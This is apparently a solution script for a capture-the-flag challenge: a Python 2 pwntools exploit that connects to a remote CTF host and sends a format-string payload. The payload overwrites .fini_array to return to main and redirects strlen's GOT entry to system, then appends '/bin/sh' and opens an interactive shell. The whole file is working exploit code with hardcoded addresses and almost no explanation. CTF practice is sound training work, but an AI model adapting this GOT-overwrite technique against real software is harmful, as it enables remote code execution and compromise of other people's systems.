#!/usr/bin/env python2.7
# coding: UTF-8

from libformatstr import FormatStr
from pwn import *

context.log_level = 'debug'

s = remote('pwn2.chal.ctf.westerns.tokyo', 16317)

# objdump -t greeting
fini_array_addr = 0x8049934 # call when program exit
main_addr = 0x80485ed
strlen_addr = 0x8049a54
system_addr = 0x08048496

print s.recvline()

fsb = FormatStr()
# got overwrite
fsb[fini_array_addr] = main_addr
fsb[strlen_addr] = system_addr
offset = 12
padding = 2
# %2034c%22$hn%23$hn%31890c%24$hn%343c%25$hn6\x99\x0V\x9a\x0T\x9a\x04\x99\x0/bin/sh
payload = fsb.payload(offset, padding, 18) + '/bin/sh'
s.sendline(payload)
s.interactive()
s.close()
